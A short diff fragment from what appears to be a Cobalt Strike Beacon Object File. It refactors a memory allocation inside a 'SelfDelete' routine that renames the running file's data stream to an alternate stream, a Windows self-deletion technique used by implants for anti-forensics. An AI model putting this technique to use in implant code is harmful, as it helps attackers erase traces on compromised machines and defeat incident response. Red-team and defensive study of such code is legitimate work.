@@ -30,7 +30,7 @@ auto SelfDelete() -> int {
     const auto new_stream = L":redxvz";
     const auto size_stream = wcslen(new_stream) * sizeof(WCHAR);
     const auto size_rename = sizeof(FILE_RENAME_INFO) + size_stream;
-    const auto p_rename = static_cast<PFILE_RENAME_INFO>(Mem::Alloc(size_rename));
+    const auto p_rename = Mem::Alloc<PFILE_RENAME_INFO>(size_rename);
     if (!p_rename) {
         BeaconPrintf(CALLBACK_ERROR, "HeapAlloc Failed: %d\n", GetLastError());
         return EXIT_FAILURE;
